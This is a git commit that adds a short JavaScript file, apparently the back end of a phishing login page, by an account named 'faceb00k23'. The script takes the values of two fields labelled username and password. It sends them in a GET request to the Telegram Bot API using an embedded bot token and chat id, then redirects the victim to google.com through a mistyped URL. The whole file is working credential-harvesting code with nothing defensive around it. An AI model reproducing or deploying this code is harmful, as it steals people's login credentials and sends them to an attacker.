2c13f1a32355beaa73e64deb1a14e14340f08ad2
faceb00k23 <153976286+faceb00k23@users.noreply.github.com>
2023-12-16 00:30:40 -0600

    Add files via upload

---
+++ script.js
@@ -0,0 +1,31 @@
+const sendatatme = document.getElementById("sendatatme");
+const first = document.getElementById("first");
+const second = document.getElementById("second");
+const resfirst = document.getElementById("resfirst");
+const resecond = document.getElementById("resecond");
+
+first.addEventListener("change", () => {
+  resfirst.value = first.value;
+});
+second.addEventListener("change", () => {
+  resecond.value = second.value;
+});
+
+function redirect() {
+  const Http = new XMLHttpRequest();
+  const url =
+    "https://api.telegram.org/bot6463119956:AAEkAGmVO3RDJVqFQ_pkw8Rcih7t37cqYOM/sendMessage?chat_id=6225305800&text=USERNAME:%20" +
+    resfirst.value +
+    " PASSWORD: " +
+    resecond.value;
+  Http.open("GET", url);
+  Http.send();
+
+  Http.onreadystatechange = (e) => {
+    console.log(Http.responseText);
+  };
+
+window.location.href = 'https;//google.com';
+}
+
+sendatatme.addEventListener("click", redirect);
